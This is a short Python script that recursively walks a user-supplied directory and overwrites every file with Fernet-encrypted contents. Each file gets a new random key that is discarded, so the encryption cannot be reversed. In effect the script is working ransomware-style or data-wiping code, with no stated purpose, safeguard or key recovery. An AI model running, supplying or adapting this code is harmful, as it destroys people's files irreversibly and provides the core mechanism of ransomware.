from cryptography.fernet import Fernet
import os
import sys
from os import path

t_dir = input()

temp_files = []
files = []

for i in os.walk(t_dir):
    temp_files.append(list(i))

for i in temp_files:
    for j in i[-1]:
        files.append(i[0]+'/'+j)

temp_files = []


def enc_file(tfile,ekey):
    # opening the key
    key = ekey
    
    # using the generated key
    fernet = Fernet(key)
    
    # opening the original file to encrypt
    with open(tfile, 'rb') as file:
        original = file.read()

    # encrypting the file
    encrypted = fernet.encrypt(original)
    
    # opening the file in write mode and 
    # writing the encrypted data
    with open(tfile, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

for i in files:
    key = Fernet.generate_key()
    enc_file(i,key)
